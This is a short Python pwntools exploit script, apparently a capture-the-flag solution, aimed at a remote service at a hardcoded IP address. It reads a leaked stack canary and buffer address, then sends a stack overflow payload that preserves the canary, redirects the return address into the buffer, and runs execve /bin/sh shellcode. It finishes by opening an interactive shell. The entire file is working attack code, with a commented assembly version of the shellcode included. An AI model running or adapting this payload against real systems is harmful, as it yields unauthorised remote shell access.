import pwn
import re

conn = pwn.remote("3.238.72.208", 3003)
canary_line = conn.recvline().decode()
buffer_line = conn.recvuntil(b": ").decode()

canary = int(re.findall(r"\(Hint stack canary value: (0x[0-9a-f]+)\)", canary_line)[0], 16)
buffer = int(re.findall(r"The program will now read 80 bytes into a 20 byte buffer at (0x[0-9a-f]+): ", buffer_line)[0], 16)

print(f"Buffer: {hex(buffer)}")
print(f"Canary address: {hex(buffer+20)}")
print(f"Canary value: {hex(canary)}")

#shellcode = pwn.asm("""\
#xor eax, eax
#push eax
#push 0x68732f2f
#push 0x6e69622f
#mov ebx, esp
#push eax
#mov edx, esp
#push ebx
#mov ecx, esp
#mov al, 11
#int 0x80
#""")
#print(f"Shellcode: {shellcode}")

conn.send(b"A"*20 + pwn.p32(canary) + b"B"*28 + pwn.p32(buffer+56) + b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')
conn.interactive()